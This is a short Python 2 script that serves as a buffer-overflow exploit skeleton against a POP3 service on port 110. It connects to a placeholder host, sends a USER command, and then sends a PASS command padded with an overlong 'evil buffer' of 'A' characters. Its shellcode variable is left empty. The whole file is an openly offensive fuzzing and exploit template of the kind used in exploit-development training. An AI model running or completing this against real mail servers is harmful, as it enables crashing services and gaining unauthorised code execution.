#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode =()



buffer="A"* 50
try:
   print "\nSending evil buffer..."
   s.connect(('host',110))
   data = s.recv(1024)
   s.send('USER username' +'\r\n')
   data = s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   s.close()
   print "\ Done. Evil Buffer sent"
except:
   print "Could not connect to POP3!"
